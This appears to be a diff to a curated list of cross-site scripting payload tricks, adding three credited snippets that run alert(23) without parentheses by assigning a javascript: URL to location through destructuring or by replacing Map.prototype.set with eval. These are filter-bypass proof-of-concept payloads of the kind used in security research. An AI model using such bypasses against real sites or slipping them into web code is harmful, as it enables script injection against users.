@@ -231,6 +231,25 @@ xss.html
     
 ---
 
+[Pepe Vila](https://blog.vwzq.net/2021/01/cast-me-an-alert/)
+
+    x = 'javascript:alert\x2823\x29';
+    ({x:location}=this);
+    
+---
+
+[Pepe Vila](https://blog.vwzq.net/2021/01/cast-me-an-alert/)
+
+     Map.prototype.set=eval;new Map([["alert\x2823\x29"]])
+    
+---
+
+[RootEval](https://twitter.com/RootEval)
+
+    x='javascript:alert\x2823\x29';x={x:location}=this
+    
+---
+
 [iwasakinoriaki](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
 
     window.name="alert(23)"
